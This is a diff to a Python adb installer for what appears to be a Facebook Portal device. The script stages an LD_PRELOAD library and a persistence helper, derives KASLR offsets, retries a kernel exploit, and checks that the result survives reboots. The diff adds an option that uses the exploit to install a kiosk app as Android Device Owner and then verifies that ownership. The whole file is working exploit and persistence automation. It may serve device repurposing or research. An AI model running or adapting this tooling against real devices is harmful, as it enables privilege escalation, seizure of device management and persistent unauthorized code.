@@ -26,6 +26,12 @@ PRELOAD_LOCAL = ROOT / "exploit/build/preload-portal-terry-5051355900018050.so"
 HELPER_LOCAL = ROOT / "helper/build/libportal_audio_persist.so"
 PRELOAD_REMOTE = "/data/local/tmp/preload-portal.so"
 HELPER_REMOTE = "/data/local/tmp/libportal_audio_persist.so"
+KIOSK_COMPONENT = "me.jxl.kiosk_satellite/.KioskAdminReceiver"
+KIOSK_OWNER_COMPONENTS = (
+    "admin=me.jxl.kiosk_satellite/.KioskAdminReceiver",
+    "admin=ComponentInfo{me.jxl.kiosk_satellite/"
+    "me.jxl.kiosk_satellite.KioskAdminReceiver}",
+)
 
 
 class InstallError(RuntimeError):
@@ -33,10 +39,17 @@ class InstallError(RuntimeError):
 
 
 class PortalInstaller:
-    def __init__(self, serial: str, attempts: int, log_dir: pathlib.Path):
+    def __init__(
+        self,
+        serial: str,
+        attempts: int,
+        log_dir: pathlib.Path,
+        device_owner: bool = False,
+    ):
         self.serial = serial
         self.attempts = attempts
         self.log_dir = log_dir
+        self.device_owner = device_owner
         self.adb = ["adb", "-s", serial]
 
     @staticmethod
@@ -104,15 +117,48 @@ class PortalInstaller:
         except InstallError:
             # adbd can disappear before acknowledging a successful reboot.
             pass
-        self.connect()
-        after = self.adb_run(
-            ["shell", "cat", "/proc/sys/kernel/random/boot_id"],
-            timeout=5,
-            check=True,
-        ).stdout.strip()
-        if not after or after == before:
-            raise InstallError(f"reboot did not change boot ID ({before})")
+        after = self.connect_after_reboot(before)
         return before, after
+
+    def connect_after_reboot(self, before: str, wait_seconds: int = 180) -> str:
+        subprocess.run(
+            ["adb", "disconnect", self.serial],
+            stdout=subprocess.DEVNULL,
+            stderr=subprocess.DEVNULL,
+            check=False,
+        )
+        deadline = time.monotonic() + wait_seconds
+        last_boot_id = ""
+        while time.monotonic() < deadline:
+            subprocess.run(
+                ["adb", "connect", self.serial],
+                stdout=subprocess.DEVNULL,
+                stderr=subprocess.DEVNULL,
+                check=False,
+            )
+            try:
+                state = self.adb_run(["get-state"], timeout=5)
+                completed = self.adb_run(
+                    ["shell", "getprop", "sys.boot_completed"], timeout=5
+                )
+                boot = self.adb_run(
+                    ["shell", "cat", "/proc/sys/kernel/random/boot_id"], timeout=5
+                )
+                last_boot_id = boot.stdout.strip()
+                if (
+                    state.returncode == 0
+                    and completed.stdout.strip() == "1"
+                    and last_boot_id
+                    and last_boot_id != before
+                ):
+                    return last_boot_id
+            except InstallError:
+                pass
+            time.sleep(3)
+        raise InstallError(
+            f"{self.serial} did not complete a new boot after {before}; "
+            f"last boot ID was {last_boot_id!r}"
+        )
 
     def verify_target(self) -> None:
         fingerprint = self.adb_run(
@@ -140,6 +186,28 @@ class PortalInstaller:
             self.adb_run(["push", str(local), remote], timeout=30, check=True)
             self.adb_run(["shell", "chmod", "0755", remote], timeout=5, check=True)
         print(f"STAGED preload={PRELOAD_REMOTE} helper={HELPER_REMOTE}")
+
+    def device_owner_preflight(self) -> bool:
+        policy = self.adb_run(
+            ["shell", "dumpsys", "device_policy"], timeout=15, check=True
+        ).stdout
+        component = KIOSK_COMPONENT
+        is_owner = "Device Owner:" in policy and any(
+            owner_component in policy for owner_component in KIOSK_OWNER_COMPONENTS
+        )
+        is_admin = (
+            "Enabled Device Admins (User 0" in policy
+            and f"    {component}:" in policy
+        )
+        if "Device Owner:" in policy and not is_owner:
+            raise InstallError("another Device Owner is already registered")
+        if not is_admin:
+            raise InstallError(f"Kiosk Satellite admin is not active: {component}")
+        print(
+            f"DEVICE_OWNER_PREFLIGHT component={component} "
+            f"active_admin=1 already_owner={int(is_owner)}"
+        )
+        return is_owner
 
     def kaslr_base(self, tag: str) -> int:
         offsets = (
@@ -245,6 +313,8 @@ class PortalInstaller:
             "GHOSTLOCK_VOLATILE_LOG": "1",
             "LD_PRELOAD": PRELOAD_REMOTE,
         }
+        if self.device_owner:
+            environment["GHOSTLOCK_KIOSK_DEVICE_OWNER"] = "1"
         self.adb_run(
             ["shell", "am", "force-stop", "--user", "0", "com.facebook.aloha.analytics"],
             timeout=10,
@@ -271,7 +341,7 @@ class PortalInstaller:
                 bufsize=1,
             )
             assert process.stdout is not None
-            deadline = time.monotonic() + 180
+            deadline = time.monotonic() + 300
             while time.monotonic() < deadline:
                 ready, _, _ = select.select([process.stdout], [], [], 1)
                 if not ready:
@@ -285,7 +355,12 @@ class PortalInstaller:
                 sys.stdout.flush()
                 output.write(line)
                 output.flush()
-                if "audio persistence install " in line and "ok=1" in line:
+                success_marker = (
+                    "kiosk device owner install "
+                    if self.device_owner
+                    else "audio persistence install "
+                )
+                if success_marker in line and "ok=1" in line:
                     success = True
                     break
                 if any(marker in line for marker in failure_markers):
@@ -341,9 +416,48 @@ class PortalInstaller:
             + last_log[-4000:]
         )
 
+    def verify_device_owner(self) -> None:
+        component = KIOSK_COMPONENT
+        policy = self.adb_run(
+            ["shell", "dumpsys", "device_policy"], timeout=15, check=True
+        ).stdout
+        owner_block = re.search(
+            r"Device Owner:\s+(.*?)(?:\n\s*Profile Owner|\n\S|\Z)",
+            policy,
+            re.DOTALL,
+        )
+        if (
+            owner_block is None
+            or not any(
+                owner_component in owner_block.group(1)
+                for owner_component in KIOSK_OWNER_COMPONENTS
+            )
+            or "User ID: 0" not in owner_block.group(1)
+        ):
+            raise InstallError(
+                "Kiosk Satellite is not the loaded Device Owner; "
+                "dumpsys excerpt follows:\n" + policy[:5000]
+            )
+        owner_property = self.adb_run(
+            ["shell", "getprop", "ro.device_owner"], timeout=5, check=True
+        ).stdout.strip()
+        if owner_property != "true":
+            raise InstallError(
+                f"Device Owner loaded but ro.device_owner={owner_property!r}"
+            )
+        print(
+            f"DEVICE_OWNER_OK component={component} user=0 "
+            f"ro.device_owner={owner_property}"
+        )
+
     def install(self) -> None:
         self.connect(wait_seconds=30)
         self.verify_target()
+        already_owner = self.device_owner_preflight() if self.device_owner else False
+        if already_owner:
+            self.verify_device_owner()
+            print("INSTALL_OK Kiosk Satellite is already Device Owner")
+            return
         self.stage()
         clean_boot_id: str | None = None
         for attempt in range(1, self.attempts + 1):
@@ -369,16 +483,19 @@ class PortalInstaller:
                 f"kaslr={base:#x} memstart={memstart:#x}",
                 flush=True,
             )
-            if not self.exploit(base, memstart, attempt):
-                self.connect()
-                clean_boot_id = self.adb_run(
-                    ["shell", "cat", "/proc/sys/kernel/random/boot_id"],
-                    timeout=5,
-                    check=True,
-                ).stdout.strip()
+            exploit_ok = self.exploit(base, memstart, attempt)
+            post_attempt_boot = self.connect_after_reboot(boot_id)
+            if not exploit_ok:
+                clean_boot_id = post_attempt_boot
                 continue
-            self.connect()
             first_boot = self.verify_watchdog()
+            if first_boot != post_attempt_boot:
+                raise InstallError(
+                    "watchdog verification boot differs from post-attempt boot: "
+                    f"{post_attempt_boot} != {first_boot}"
+                )
+            if self.device_owner:
+                self.verify_device_owner()
             print("VERIFY_REBOOT starting", flush=True)
             before, second_boot = self.reboot()
             if before != first_boot:
@@ -386,6 +503,8 @@ class PortalInstaller:
                     f"unexpected boot changed before verification: {first_boot} -> {before}"
                 )
             self.verify_watchdog()
+            if self.device_owner:
+                self.verify_device_owner()
             print(
                 f"INSTALL_OK first_boot={first_boot} second_boot={second_boot} "
                 f"logs={self.log_dir}"
@@ -415,6 +534,14 @@ def parse_args() -> argparse.Namespace:
     parser.add_argument("--serial", default="192.168.1.72:5555")
     parser.add_argument("--attempts", type=int, default=12)
     parser.add_argument(
+        "--device-owner",
+        action="store_true",
+        help=(
+            "also install Kiosk Satellite as Device Owner and verify it "
+            "across both reboots"
+        ),
+    )
+    parser.add_argument(
         "--skip-build", action="store_true", help="use existing build outputs"
     )
     parser.add_argument(
@@ -436,7 +563,9 @@ def main() -> int:
     try:
         if not args.skip_build:
             build()
-        PortalInstaller(args.serial, args.attempts, log_dir).install()
+        PortalInstaller(
+            args.serial, args.attempts, log_dir, device_owner=args.device_owner
+        ).install()
     except (InstallError, OSError, zipfile.BadZipFile) as exc:
         print(f"INSTALL_ERROR: {exc}", file=sys.stderr)
         return 1
